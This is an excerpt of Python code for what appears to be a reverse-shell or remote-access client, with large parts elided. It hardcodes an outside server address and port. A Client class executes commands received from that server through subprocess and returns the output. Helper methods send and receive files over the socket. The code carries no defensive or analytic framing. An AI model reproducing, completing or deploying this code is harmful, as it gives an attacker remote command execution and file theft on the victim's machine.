...
SERVER_HOST = "158.160.50.176"
SERVER_PORT = 5003
BUFFER_SIZE = 65536  # max size of messages, setting to 65536 after experimentation, MTU size
...
class Client:
    ...
    def handle_command(self, command):
        ...
        if command.lower() in ["exit", "quit"]:
            ...
            output = subprocess.getoutput(command).encode("cp1251").decode("cp866")
        return output
    ...
    @classmethod
    def _receive_file(cls, s: socket.socket, buffer_size=65536, verbose=False):
    ...
    @classmethod
    def _send_file(cls, s: socket.socket, filename, buffer_size=65536, verbose=False):
        # get the file size
